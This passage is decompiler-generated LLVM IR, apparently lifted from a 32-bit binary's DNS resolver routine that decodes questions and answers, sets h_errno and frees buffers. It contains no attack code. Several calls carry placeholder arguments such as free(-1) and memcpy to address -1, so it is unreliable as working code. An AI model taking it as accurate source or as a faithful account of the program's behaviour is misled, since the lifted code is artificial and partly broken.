  %v2_8056b99 = inttoptr i32 %v1_8056b99 to i32*
  %v3_8056b99 = load i32, i32* %v2_8056b99, align 4
  %tmp49 = icmp slt i32 %v3_8056b99, 1
  br i1 %tmp49, label %dec_label_pc_8056ba9, label %dec_label_pc_8056ba0

dec_label_pc_8056ba0:                             ; preds = %dec_label_pc_8056b99
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056bc8

dec_label_pc_8056ba9:                             ; preds = %dec_label_pc_8056b99
  %v0_8056ba9 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056ba9, i32* %eax.global-to-local, align 4
  %v1_8056bae = inttoptr i32 %v0_8056ba9 to i32*
  store i32 4, i32* %v1_8056bae, align 4
  br label %dec_label_pc_8056e44

dec_label_pc_8056bb9:                             ; preds = %dec_label_pc_8056bc8
  %v2_8056bb9 = add i32 %v0_8056bd0, -4
  %v3_8056bb9 = inttoptr i32 %v2_8056bb9 to i32*
  store i32 %v0_8056bb9, i32* %v3_8056bb9, align 4
  %v0_8056bba = load i32, i32* @ebx, align 4
  %v1_8056bba = add i32 %v0_8056bba, 1
  store i32 %v1_8056bba, i32* @ebx, align 4
  %v0_8056bbb = load i32, i32* @eax, align 4
  %v2_8056bbb = add i32 %v0_8056bd0, -8
  %v3_8056bbb = inttoptr i32 %v2_8056bbb to i32*
  store i32 %v0_8056bbb, i32* %v3_8056bbb, align 4
  %v0_8056bbc = load i32, i32* @esi, align 4
  %v2_8056bbc = add i32 %v0_8056bd0, -12
  %v3_8056bbc = inttoptr i32 %v2_8056bbc to i32*
  store i32 %v0_8056bbc, i32* %v3_8056bbc, align 4
  %v2_8056bbd = add i32 %v0_8056bd0, -16
  %v3_8056bbd = inttoptr i32 %v2_8056bbd to i32*
  store i32 %v2_805679e, i32* %v3_8056bbd, align 4
  %v0_8056bbe = call i32 @__length_question()
  store i32 %v0_8056bbe, i32* @eax, align 4
  %v0_8056bc3 = load i32, i32* @esp, align 4
  %v1_8056bc3 = add i32 %v0_8056bc3, 16
  %v0_8056bc6 = load i32, i32* @esi, align 4
  %v2_8056bc6 = add i32 %v0_8056bc6, %v0_8056bbe
  %v0_8056bc8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056bc8

dec_label_pc_8056bc8:                             ; preds = %dec_label_pc_8056ba0, %dec_label_pc_8056bb9
  %v0_8056bb9 = phi i32 [ %v3_8056b22, %dec_label_pc_8056ba0 ], [ %v0_8056bbe, %dec_label_pc_8056bb9 ]
  %v0_8056bd0 = phi i32 [ %v1_8056b08, %dec_label_pc_8056ba0 ], [ %v1_8056bc3, %dec_label_pc_8056bb9 ]
  %v0_8056bc8 = phi i32 [ 0, %dec_label_pc_8056ba0 ], [ %v0_8056bc8.pre, %dec_label_pc_8056bb9 ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8056ba0 ], [ %v2_8056bc6, %dec_label_pc_8056bb9 ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8056bc8 = add i32 %v0_8056bd0, 100
  %v3_8056bc8 = inttoptr i32 %v2_8056bc8 to i32*
  %v4_8056bc8 = load i32, i32* %v3_8056bc8, align 4
  %v5_8056bc8 = sub i32 %v0_8056bc8, %v4_8056bc8
  %v11_8056bc8 = xor i32 %v4_8056bc8, %v0_8056bc8
  %v12_8056bc8 = xor i32 %v5_8056bc8, %v0_8056bc8
  %v13_8056bc8 = and i32 %v12_8056bc8, %v11_8056bc8
  %v14_8056bc8 = icmp slt i32 %v13_8056bc8, 0
  %v16_8056bc8 = icmp slt i32 %v5_8056bc8, 0
  %v2_8056bcc = icmp eq i1 %v16_8056bc8, %v14_8056bc8
  br i1 %v2_8056bcc, label %dec_label_pc_8056bce, label %dec_label_pc_8056bb9

dec_label_pc_8056bce:                             ; preds = %dec_label_pc_8056bc8
  store i32 0, i32* @ebx, align 4
  %v1_8056bd0 = add i32 %v0_8056bd0, 27
  %v2_8056bd0 = inttoptr i32 %v1_8056bd0 to i8*
  store i8 1, i8* %v2_8056bd0, align 1
  %v0_8056cfe.pre = load i32, i32* @ebx, align 4
  %v1_8056cfe.pre = load i32, i32* @esp, align 4
  %v2_8056cfe55 = add i32 %v1_8056cfe.pre, 104
  %v3_8056cfe56 = inttoptr i32 %v2_8056cfe55 to i32*
  %v4_8056cfe57 = load i32, i32* %v3_8056cfe56, align 4
  %v5_8056cfe58 = sub i32 %v0_8056cfe.pre, %v4_8056cfe57
  %v11_8056cfe60 = xor i32 %v4_8056cfe57, %v0_8056cfe.pre
  %v12_8056cfe61 = xor i32 %v5_8056cfe58, %v0_8056cfe.pre
  %v13_8056cfe62 = and i32 %v12_8056cfe61, %v11_8056cfe60
  %v14_8056cfe63 = icmp slt i32 %v13_8056cfe62, 0
  %v16_8056cfe65 = icmp slt i32 %v5_8056cfe58, 0
  %v2_8056d0266 = icmp eq i1 %v16_8056cfe65, %v14_8056cfe63
  br i1 %v2_8056d0266, label %dec_label_pc_8056d0e, label %dec_label_pc_8056d04.lr.ph

dec_label_pc_8056d04.lr.ph:                       ; preds = %dec_label_pc_8056bce
  %v0_8056d04.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056d04

dec_label_pc_8056bda:                             ; preds = %dec_label_pc_8056d04
  %v1_8056bda = add i32 %v0_8056bda67, 116
  store i32 %v1_8056bda, i32* %eax.global-to-local, align 4
  %v2_8056bde = add i32 %v0_8056bda67, -4
  %v3_8056bde = inttoptr i32 %v2_8056bde to i32*
  store i32 %v1_8056bda, i32* %v3_8056bde, align 4
  %v3_8056bdf = load i32, i32* %v3_8056d04, align 4
  %v5_8056bdf = add i32 %v0_8056bda67, -8
  %v6_8056bdf = inttoptr i32 %v5_8056bdf to i32*
  store i32 %v3_8056bdf, i32* %v6_8056bdf, align 4
  %v0_8056be3 = load i32, i32* @esi, align 4
  %v2_8056be3 = add i32 %v0_8056bda67, -12
  %v3_8056be3 = inttoptr i32 %v2_8056be3 to i32*
  store i32 %v0_8056be3, i32* %v3_8056be3, align 4
  %v2_8056be4 = add i32 %v0_8056bda67, -16
  %v3_8056be4 = inttoptr i32 %v2_8056be4 to i32*
  store i32 %v2_805679e, i32* %v3_8056be4, align 4
  %v0_8056be5 = call i32 @__decode_answer()
  store i32 %v0_8056be5, i32* @eax, align 4
  %v1_8056bea = load i32, i32* @esp, align 4
  %v2_8056bea = add i32 %v1_8056bea, 68
  %v3_8056bea = inttoptr i32 %v2_8056bea to i32*
  store i32 %v0_8056be5, i32* %v3_8056bea, align 4
  %v0_8056bee = load i32, i32* @esp, align 4
  %v1_8056bee = add i32 %v0_8056bee, 16
  %v2_8056bf1 = icmp slt i32 %v0_8056be5, 0
  %v1_8056bf3 = icmp eq i1 %v2_8056bf1, false
  br i1 %v1_8056bf3, label %dec_label_pc_8056c0d, label %dec_label_pc_8056bf5

dec_label_pc_8056bf5:                             ; preds = %dec_label_pc_8056bda
  %v0_8056bf5 = load i32, i32* @ebx, align 4
  %v1_8056bf5 = icmp eq i32 %v0_8056bf5, 0
  br i1 %v1_8056bf5, label %dec_label_pc_8056da0, label %dec_label_pc_8056bfd

dec_label_pc_8056bfd:                             ; preds = %dec_label_pc_8056bf5
  %v1_8056bfd = add i32 %v0_8056bee, 100
  %v2_8056bfd = inttoptr i32 %v1_8056bfd to i32*
  %v3_8056bfd = load i32, i32* %v2_8056bfd, align 4
  %v4_8056bfd = icmp eq i32 %v3_8056bfd, 0
  br i1 %v4_8056bfd, label %dec_label_pc_8056da0, label %dec_label_pc_8056d0e

dec_label_pc_8056c0d:                             ; preds = %dec_label_pc_8056bda
  %v1_8056c0d = add i32 %v0_8056bee, 43
  %v2_8056c0d = inttoptr i32 %v1_8056c0d to i8*
  %v3_8056c0d = load i8, i8* %v2_8056c0d, align 1
  %v4_8056c0d = icmp eq i8 %v3_8056c0d, 0
  br i1 %v4_8056c0d, label %dec_label_pc_8056cae, label %dec_label_pc_8056c18

dec_label_pc_8056c18:                             ; preds = %dec_label_pc_8056c0d
  %v0_8056c18 = load i32, i32* @edi, align 4
  %v1_8056c18 = add i32 %v0_8056c18, 28
  %v2_8056c18 = inttoptr i32 %v1_8056c18 to i32*
  %v3_8056c18 = load i32, i32* %v2_8056c18, align 4
  store i32 %v3_8056c18, i32* %eax.global-to-local, align 4
  %v2_8056c1b = add i32 %v0_8056bee, 160
  %v3_8056c1b = inttoptr i32 %v2_8056c1b to i32*
  store i32 %v3_8056c18, i32* %v3_8056c1b, align 4
  %v0_8056c22 = load i32, i32* @edi, align 4
  %v1_8056c22 = add i32 %v0_8056c22, 32
  %v2_8056c22 = inttoptr i32 %v1_8056c22 to i32*
  %v3_8056c22 = load i32, i32* %v2_8056c22, align 4
  store i32 %v3_8056c22, i32* %eax.global-to-local, align 4
  %v1_8056c25 = load i32, i32* @esp, align 4
  %v2_8056c25 = add i32 %v1_8056c25, 148
  %v3_8056c25 = inttoptr i32 %v2_8056c25 to i32*
  store i32 %v3_8056c22, i32* %v3_8056c25, align 4
  %v0_8056c2c = load i32, i32* @edi, align 4
  %v1_8056c2c = add i32 %v0_8056c2c, 36
  %v2_8056c2c = inttoptr i32 %v1_8056c2c to i32*
  %v3_8056c2c = load i32, i32* %v2_8056c2c, align 4
  store i32 %v3_8056c2c, i32* %eax.global-to-local, align 4
  %v1_8056c2f = load i32, i32* @esp, align 4
  %v2_8056c2f = add i32 %v1_8056c2f, 152
  %v3_8056c2f = inttoptr i32 %v2_8056c2f to i32*
  store i32 %v3_8056c2c, i32* %v3_8056c2f, align 4
  %v0_8056c36 = load i32, i32* @ecx, align 4
  %v1_8056c36 = load i32, i32* @esp, align 4
  %v2_8056c36 = add i32 %v1_8056c36, -4
  %v3_8056c36 = inttoptr i32 %v2_8056c36 to i32*
  store i32 %v0_8056c36, i32* %v3_8056c36, align 4
  %v1_8056c37 = add i32 %v1_8056c36, -8
  %v2_8056c37 = inttoptr i32 %v1_8056c37 to i32*
  store i32 40, i32* %v2_8056c37, align 4
  %v1_8056c39 = add i32 %v1_8056c36, 116
  store i32 %v1_8056c39, i32* %edx.global-to-local, align 4
  %v2_8056c3d = add i32 %v1_8056c36, -12
  %v3_8056c3d = inttoptr i32 %v2_8056c3d to i32*
  store i32 %v1_8056c39, i32* %v3_8056c3d, align 4
  %v0_8056c3e = load i32, i32* @edi, align 4
  %v2_8056c3e = add i32 %v1_8056c36, -16
  %v3_8056c3e = inttoptr i32 %v2_8056c3e to i32*
  store i32 %v0_8056c3e, i32* %v3_8056c3e, align 4
  %v4_8056c3f = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056c3f, i32* %eax.global-to-local, align 4
  %v0_8056c44 = load i32, i32* @edi, align 4
  %v1_8056c44 = add i32 %v0_8056c44, 4
  %v2_8056c44 = inttoptr i32 %v1_8056c44 to i32*
  %v3_8056c44 = load i32, i32* %v2_8056c44, align 4
  store i32 %v3_8056c44, i32* %eax.global-to-local, align 4
  %v0_8056c47 = load i32, i32* @esp, align 4
  %v1_8056c47 = add i32 %v0_8056c47, 16
  %v9_8056c4a = icmp eq i32 %v3_8056c44, 24
  br i1 %v9_8056c4a, label %dec_label_pc_8056c18.dec_label_pc_8056c71_crit_edge, label %dec_label_pc_8056c4f

dec_label_pc_8056c18.dec_label_pc_8056c71_crit_edge: ; preds = %dec_label_pc_8056c18
  %.pre24 = add i32 %v0_8056c47, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8056c71.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8056c71

dec_label_pc_8056c4f:                             ; preds = %dec_label_pc_8056c18
  %v1_8056c4f = add i32 %v0_8056c44, 28
  %v2_8056c4f = inttoptr i32 %v1_8056c4f to i32*
  %v3_8056c4f = load i32, i32* %v2_8056c4f, align 4
  %v4_8056c4f = icmp eq i32 %v3_8056c4f, 0
  br i1 %v4_8056c4f, label %dec_label_pc_8056d0e, label %dec_label_pc_8056c59

dec_label_pc_8056c59:                             ; preds = %dec_label_pc_8056c4f
  %v1_8056c59 = add i32 %v0_8056c47, 260
  %v2_8056c59 = inttoptr i32 %v1_8056c59 to i32*
  %v3_8056c59 = load i32, i32* %v2_8056c59, align 4
  %v12_8056c59 = icmp eq i32 %v3_8056c59, 1
  br i1 %v12_8056c59, label %dec_label_pc_8056c71, label %dec_label_pc_8056c63

dec_label_pc_8056c63:                             ; preds = %dec_label_pc_8056c59
  %v12_8056c63 = icmp eq i32 %v3_8056c59, 28
  %v1_8056c6b = icmp eq i1 %v12_8056c63, false
  br i1 %v1_8056c6b, label %dec_label_pc_8056d0e, label %dec_label_pc_8056c71

dec_label_pc_8056c71:                             ; preds = %dec_label_pc_8056c18.dec_label_pc_8056c71_crit_edge, %dec_label_pc_8056c63, %dec_label_pc_8056c59
  %v4_8056c71 = phi i32 [ %v4_8056c71.pre, %dec_label_pc_8056c18.dec_label_pc_8056c71_crit_edge ], [ %v3_8056c59, %dec_label_pc_8056c63 ], [ %v3_8056c59, %dec_label_pc_8056c59 ]
  %v15_8056c71 = icmp eq i32 %v3_8056c44, %v4_8056c71
  br i1 %v15_8056c71, label %dec_label_pc_8056c86, label %dec_label_pc_8056c7a

dec_label_pc_8056c7a:                             ; preds = %dec_label_pc_8056c71
  %v1_8056c7d = inttoptr i32 %v0_8056c44 to i32*
  %v2_8056c7d = load i32, i32* %v1_8056c7d, align 4
  %v5_8056c7d = inttoptr i32 %v0_8056c47 to i32*
  store i32 %v2_8056c7d, i32* %v5_8056c7d, align 4
  %v1_8056c7f = call i32 @free(i32 -1)
  store i32 %v1_8056c7f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056cf6

dec_label_pc_8056c86:                             ; preds = %dec_label_pc_8056c71
  %v0_8056c86 = load i32, i32* @ebx, align 4
  %v1_8056c88 = sub i32 -1, %v0_8056c86
  store i32 %v1_8056c88, i32* %eax.global-to-local, align 4
  %v2_8056c8a = add i32 %v0_8056c47, 120
  %v3_8056c8a = inttoptr i32 %v2_8056c8a to i32*
  %v4_8056c8a = load i32, i32* %v3_8056c8a, align 4
  %v5_8056c8a = add i32 %v4_8056c8a, %v1_8056c88
  store i32 %v5_8056c8a, i32* %eax.global-to-local, align 4
  %v2_8056c8e = add i32 %v0_8056c44, 36
  %v3_8056c8e = inttoptr i32 %v2_8056c8e to i32*
  store i32 %v5_8056c8a, i32* %v3_8056c8e, align 4
  %v0_8056c91 = load i32, i32* @edi, align 4
  %v1_8056c91 = add i32 %v0_8056c91, 16
  %v2_8056c91 = inttoptr i32 %v1_8056c91 to i32*
  %v3_8056c91 = load i32, i32* %v2_8056c91, align 4
  %v1_8056c94 = add i32 %v3_8056c91, 4
  store i32 %v1_8056c94, i32* %eax.global-to-local, align 4
  %v2_8056c97 = add i32 %v0_8056c91, 36
  %v3_8056c97 = inttoptr i32 %v2_8056c97 to i32*
  %v4_8056c97 = load i32, i32* %v3_8056c97, align 4
  %v7_8056c97 = mul i32 %v4_8056c97, %v1_8056c94
  store i32 %v7_8056c97, i32* %eax.global-to-local, align 4
  %v2_8056c9b = add i32 %v0_8056c91, 32
  %v3_8056c9b = inttoptr i32 %v2_8056c9b to i32*
  %v4_8056c9b = load i32, i32* %v3_8056c9b, align 4
  %v6_8056c9e = icmp ugt i32 %v7_8056c97, %v4_8056c9b
  br i1 %v6_8056c9e, label %dec_label_pc_8056c86.dec_label_pc_8056d0e.loopexit_crit_edge, label %dec_label_pc_8056ca0

dec_label_pc_8056c86.dec_label_pc_8056d0e.loopexit_crit_edge: ; preds = %dec_label_pc_8056c86
  %v0_8056d0e.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056d0e

dec_label_pc_8056ca0:                             ; preds = %dec_label_pc_8056c86
  store i32 0, i32* %v3_8056c97, align 4
  %v0_8056ca7 = load i32, i32* @esp, align 4
  %v1_8056ca7 = add i32 %v0_8056ca7, 27
  %v2_8056ca7 = inttoptr i32 %v1_8056ca7 to i8*
  store i8 0, i8* %v2_8056ca7, align 1
  %v1_8056cf9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056cf9

dec_label_pc_8056cae:                             ; preds = %dec_label_pc_8056c0d
  %v1_8056cb1 = add i32 %v0_8056bee, 132
  %v2_8056cb1 = inttoptr i32 %v1_8056cb1 to i32*
  %v3_8056cb1 = load i32, i32* %v2_8056cb1, align 4
  %v6_8056cb1 = inttoptr i32 %v0_8056bee to i32*
  store i32 %v3_8056cb1, i32* %v6_8056cb1, align 4
  %v1_8056cb8 = call i32 @free(i32 -1)
  store i32 %v1_8056cb8, i32* %eax.global-to-local, align 4
  %v0_8056cbd = load i32, i32* @esp, align 4
  %v1_8056cbd = add i32 %v0_8056cbd, 16
  %v1_8056cc0 = add i32 %v0_8056cbd, 260
  %v2_8056cc0 = inttoptr i32 %v1_8056cc0 to i32*
  %v3_8056cc0 = load i32, i32* %v2_8056cc0, align 4
  store i32 %v3_8056cc0, i32* %eax.global-to-local, align 4
  %v1_8056cc7 = add i32 %v0_8056cbd, 136
  %v2_8056cc7 = inttoptr i32 %v1_8056cc7 to i32*
  %v3_8056cc7 = load i32, i32* %v2_8056cc7, align 4
  %v15_8056cc7 = icmp eq i32 %v3_8056cc7, %v3_8056cc0
  %v1_8056ccb = icmp eq i1 %v15_8056cc7, false
  br i1 %v1_8056ccb, label %dec_label_pc_8056cf9, label %dec_label_pc_8056ccd

dec_label_pc_8056ccd:                             ; preds = %dec_label_pc_8056cae
  %v0_8056ccd = load i32, i32* @edi, align 4
  %v1_8056ccd = add i32 %v0_8056ccd, 16
  %v2_8056ccd = inttoptr i32 %v1_8056ccd to i32*
  %v3_8056ccd = load i32, i32* %v2_8056ccd, align 4
  store i32 %v3_8056ccd, i32* %eax.global-to-local, align 4
  %v2_8056cd0 = add i32 %v0_8056cbd, 148
  %v3_8056cd0 = inttoptr i32 %v2_8056cd0 to i32*
  %v4_8056cd0 = load i32, i32* %v3_8056cd0, align 4
  %v15_8056cd0 = icmp eq i32 %v3_8056ccd, %v4_8056cd0
  %v1_8056cd7 = icmp eq i1 %v15_8056cd0, false
  br i1 %v1_8056cd7, label %dec_label_pc_8056d93, label %dec_label_pc_8056cdd

dec_label_pc_8056cdd:                             ; preds = %dec_label_pc_8056ccd
  %v0_8056cdd = load i32, i32* @edx, align 4
  %v2_8056cdd = add i32 %v0_8056cbd, 12
  %v3_8056cdd = inttoptr i32 %v2_8056cdd to i32*
  store i32 %v0_8056cdd, i32* %v3_8056cdd, align 4
  %v0_8056cde = load i32, i32* %eax.global-to-local, align 4
  %v2_8056cde = add i32 %v0_8056cbd, 8
  %v3_8056cde = inttoptr i32 %v2_8056cde to i32*
  store i32 %v0_8056cde, i32* %v3_8056cde, align 4
  %v1_8056cdf = add i32 %v0_8056cbd, 152
  %v2_8056cdf = inttoptr i32 %v1_8056cdf to i32*
  %v3_8056cdf = load i32, i32* %v2_8056cdf, align 4
  %v5_8056cdf = add i32 %v0_8056cbd, 4
  %v6_8056cdf = inttoptr i32 %v5_8056cdf to i32*
  store i32 %v3_8056cdf, i32* %v6_8056cdf, align 4
  %v0_8056ce6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056ce6 = load i32, i32* @edi, align 4
  %v2_8056ce6 = add i32 %v1_8056ce6, 36
  %v3_8056ce6 = inttoptr i32 %v2_8056ce6 to i32*
  %v4_8056ce6 = load i32, i32* %v3_8056ce6, align 4
  %v7_8056ce6 = mul i32 %v4_8056ce6, %v0_8056ce6
  store i32 %v7_8056ce6, i32* %eax.global-to-local, align 4
  %v2_8056cea = add i32 %v1_8056ce6, 28
  %v3_8056cea = inttoptr i32 %v2_8056cea to i32*
  %v4_8056cea = load i32, i32* %v3_8056cea, align 4
  %v5_8056cea = add i32 %v4_8056cea, %v7_8056ce6
  store i32 %v5_8056cea, i32* %eax.global-to-local, align 4
  %v3_8056ced = inttoptr i32 %v0_8056cbd to i32*
  store i32 %v5_8056cea, i32* %v3_8056ced, align 4
  %v4_8056cee = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056cee, i32* %eax.global-to-local, align 4
  %v0_8056cf3 = load i32, i32* @edi, align 4
  %v1_8056cf3 = add i32 %v0_8056cf3, 36
  %v2_8056cf3 = inttoptr i32 %v1_8056cf3 to i32*
  %v3_8056cf3 = load i32, i32* %v2_8056cf3, align 4
  %v4_8056cf3 = add i32 %v3_8056cf3, 1
  store i32 %v4_8056cf3, i32* %v2_8056cf3, align 4
  br label %dec_label_pc_8056cf6

dec_label_pc_8056cf6:                             ; preds = %dec_label_pc_8056c7a, %dec_label_pc_8056cdd
  %v0_8056cf6 = load i32, i32* @esp, align 4
  %v1_8056cf6 = add i32 %v0_8056cf6, 16
  br label %dec_label_pc_8056cf9

dec_label_pc_8056cf9:                             ; preds = %dec_label_pc_8056cae, %dec_label_pc_8056ca0, %dec_label_pc_8056cf6
  %v1_8056cf9 = phi i32 [ %v1_8056cbd, %dec_label_pc_8056cae ], [ %v1_8056cf9.pre, %dec_label_pc_8056ca0 ], [ %v1_8056cf6, %dec_label_pc_8056cf6 ]
  %v0_8056cf9 = load i32, i32* @esi, align 4
  %v2_8056cf9 = add i32 %v1_8056cf9, 52
  %v3_8056cf9 = inttoptr i32 %v2_8056cf9 to i32*
  %v4_8056cf9 = load i32, i32* %v3_8056cf9, align 4
  %v5_8056cf9 = add i32 %v4_8056cf9, %v0_8056cf9
  store i32 %v5_8056cf9, i32* @esi, align 4
  %v0_8056cfd = load i32, i32* @ebx, align 4
  %v1_8056cfd = add i32 %v0_8056cfd, 1
  store i32 %v1_8056cfd, i32* @ebx, align 4
  %v2_8056cfe = add i32 %v1_8056cf9, 104
  %v3_8056cfe = inttoptr i32 %v2_8056cfe to i32*
  %v4_8056cfe = load i32, i32* %v3_8056cfe, align 4
  %v5_8056cfe = sub i32 %v1_8056cfd, %v4_8056cfe
  %v11_8056cfe = xor i32 %v4_8056cfe, %v1_8056cfd
  %v12_8056cfe = xor i32 %v5_8056cfe, %v1_8056cfd
  %v13_8056cfe = and i32 %v12_8056cfe, %v11_8056cfe
  %v14_8056cfe = icmp slt i32 %v13_8056cfe, 0
  %v16_8056cfe = icmp slt i32 %v5_8056cfe, 0
  %v2_8056d02 = icmp eq i1 %v16_8056cfe, %v14_8056cfe
  br i1 %v2_8056d02, label %dec_label_pc_8056d0e, label %dec_label_pc_8056d04

dec_label_pc_8056d04:                             ; preds = %dec_label_pc_8056d04.lr.ph, %dec_label_pc_8056cf9
  %v0_8056d04 = phi i32 [ %v0_8056d04.pre, %dec_label_pc_8056d04.lr.ph ], [ %v5_8056cf9, %dec_label_pc_8056cf9 ]
  %v0_8056bda67 = phi i32 [ %v1_8056cfe.pre, %dec_label_pc_8056d04.lr.ph ], [ %v1_8056cf9, %dec_label_pc_8056cf9 ]
  %v2_8056d04 = add i32 %v0_8056bda67, 16
  %v3_8056d04 = inttoptr i32 %v2_8056d04 to i32*
  %v4_8056d04 = load i32, i32* %v3_8056d04, align 4
  %v5_8056d04 = sub i32 %v0_8056d04, %v4_8056d04
  %v11_8056d04 = xor i32 %v4_8056d04, %v0_8056d04
  %v12_8056d04 = xor i32 %v5_8056d04, %v0_8056d04
  %v13_8056d04 = and i32 %v12_8056d04, %v11_8056d04
  %v14_8056d04 = icmp slt i32 %v13_8056d04, 0
  %v16_8056d04 = icmp slt i32 %v5_8056d04, 0
  %v2_8056d08 = icmp eq i1 %v16_8056d04, %v14_8056d04
  br i1 %v2_8056d08, label %dec_label_pc_8056d0e, label %dec_label_pc_8056bda

dec_label_pc_8056d0e:                             ; preds = %dec_label_pc_8056bfd, %dec_label_pc_8056bce, %dec_label_pc_8056cf9, %dec_label_pc_8056c4f, %dec_label_pc_8056c63, %dec_label_pc_8056d04, %dec_label_pc_8056c86.dec_label_pc_8056d0e.loopexit_crit_edge
  %v0_8056d0e = phi i32 [ %v0_8056d0e.pre.pre, %dec_label_pc_8056c86.dec_label_pc_8056d0e.loopexit_crit_edge ], [ %v1_8056cfe.pre, %dec_label_pc_8056bce ], [ %v1_8056cf9, %dec_label_pc_8056cf9 ], [ %v1_8056c47, %dec_label_pc_8056c4f ], [ %v1_8056c47, %dec_label_pc_8056c63 ], [ %v0_8056bda67, %dec_label_pc_8056d04 ], [ %v1_8056bee, %dec_label_pc_8056bfd ]
  %v1_8056d11 = add i32 %v0_8056d0e, 20
  %v2_8056d11 = inttoptr i32 %v1_8056d11 to i32*
  %v3_8056d11 = load i32, i32* %v2_8056d11, align 4
  %v5_8056d11 = add i32 %v0_8056d0e, -16
  %v6_8056d11 = inttoptr i32 %v5_8056d11 to i32*
  store i32 %v3_8056d11, i32* %v6_8056d11, align 4
  %v1_8056d15 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8056d15, i32* %eax.global-to-local, align 4
  %v0_8056d1a = load i32, i32* @esp, align 4
  %v1_8056d1d = add i32 %v0_8056d1a, 272
  %v2_8056d1d = inttoptr i32 %v1_8056d1d to i32*
  %v3_8056d1d = load i32, i32* %v2_8056d1d, align 4
  %v4_8056d1d = icmp eq i32 %v3_8056d1d, 0
  br i1 %v4_8056d1d, label %dec_label_pc_8056d32, label %dec_label_pc_8056d27

dec_label_pc_8056d27:                             ; preds = %dec_label_pc_8056d0e
  store i32 %v3_8056d1d, i32* %edx.global-to-local, align 4
  %v2_8056d2e = inttoptr i32 %v3_8056d1d to i32*
  store i32 %v2_805679e, i32* %v2_8056d2e, align 4
  %v0_8056d3e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056d3e

dec_label_pc_8056d32:                             ; preds = %dec_label_pc_8056d0e
  %v3_8056d35 = inttoptr i32 %v0_8056d1a to i32*
  store i32 %v2_805679e, i32* %v3_8056d35, align 4
  %v1_8056d36 = call i32 @free(i32 -1)
  store i32 %v1_8056d36, i32* %eax.global-to-local, align 4
  %v0_8056d3b = load i32, i32* @esp, align 4
  %v1_8056d3b = add i32 %v0_8056d3b, 16
  br label %dec_label_pc_8056d3e

dec_label_pc_8056d3e:                             ; preds = %dec_label_pc_8056d27, %dec_label_pc_8056d32
  %v0_8056d3e = phi i32 [ %v0_8056d3e.pre, %dec_label_pc_8056d27 ], [ %v1_8056d3b, %dec_label_pc_8056d32 ]
  %v1_8056d41 = add i32 %v0_8056d3e, 12
  %v2_8056d41 = inttoptr i32 %v1_8056d41 to i32*
  %v3_8056d41 = load i32, i32* %v2_8056d41, align 4
  %v5_8056d41 = add i32 %v0_8056d3e, -16
  %v6_8056d41 = inttoptr i32 %v5_8056d41 to i32*
  store i32 %v3_8056d41, i32* %v6_8056d41, align 4
  %v1_8056d45 = call i32 @free(i32 -1)
  store i32 %v1_8056d45, i32* @eax, align 4
  %v0_8056d4a = load i32, i32* @esp, align 4
  %v1_8056d4d = add i32 %v0_8056d4a, 8
  %v2_8056d4d = inttoptr i32 %v1_8056d4d to i32*
  store i32 ptrtoint (i8** @global_var_80646e8.579 to i32), i32* %v2_8056d4d, align 4
  %v1_8056d52 = add i32 %v0_8056d4a, 4
  %v2_8056d52 = inttoptr i32 %v1_8056d52 to i32*
  store i32 134567263, i32* %v2_8056d52, align 4
  %v1_8056d57 = add i32 %v0_8056d4a, 200
  store i32 %v1_8056d57, i32* %ebx.global-to-local, align 4
  %v3_8056d5e = inttoptr i32 %v0_8056d4a to i32*
  store i32 %v1_8056d57, i32* %v3_8056d5e, align 4
  %v2_8056d5f = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_8056d5f, i32* %eax.global-to-local, align 4
  %v0_8056d64 = load i32, i32* @esp, align 4
  %v1_8056d64 = inttoptr i32 %v0_8056d64 to i32*
  store i32 ptrtoint (i8** @global_var_80646e8.579 to i32), i32* %v1_8056d64, align 4
  %v1_8056d6b = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056d6b, i32* %eax.global-to-local, align 4
  %v0_8056d70 = load i32, i32* @esp, align 4
  %v1_8056d70 = add i32 %v0_8056d70, 56
  %v2_8056d70 = inttoptr i32 %v1_8056d70 to i32*
  %v3_8056d70 = load i32, i32* %v2_8056d70, align 4
  store i32 %v3_8056d70, i32* @eax, align 4
  %v1_8056d74 = add i32 %v0_8056d70, 60
  %v2_8056d74 = inttoptr i32 %v1_8056d74 to i32*
  %v3_8056d74 = load i32, i32* %v2_8056d74, align 4
  store i32 %v3_8056d74, i32* %edx.global-to-local, align 4
  %v1_8056d78 = inttoptr i32 %v0_8056d70 to i32*
  %v3_8056d78 = add i32 %v0_8056d70, 4
  %v1_8056d79 = inttoptr i32 %v3_8056d78 to i32*
  %v1_8056d7a = sext i32 %v3_8056d70 to i64
  store i64 %v1_8056d7a, i64* @global_var_8064700.580, align 256
  %v1_8056d7f = trunc i32 %v3_8056d74 to i16
  store i16 %v1_8056d7f, i16* @global_var_805e444.581, align 4
  store i32 1, i32* %v1_8056d79, align 4
  %v0_8056d88 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056d88, i32* %v1_8056d78, align 4
  %v2_8056d89 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_8056d89, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056eca

dec_label_pc_8056d93:                             ; preds = %dec_label_pc_8056ccd
  %v1_8056d96 = inttoptr i32 %v0_8056ccd to i32*
  %v2_8056d96 = load i32, i32* %v1_8056d96, align 4
  %v5_8056d96 = inttoptr i32 %v0_8056cbd to i32*
  store i32 %v2_8056d96, i32* %v5_8056d96, align 4
  %v1_8056d98 = call i32 @free(i32 -1)
  store i32 %v1_8056d98, i32* @eax, align 4
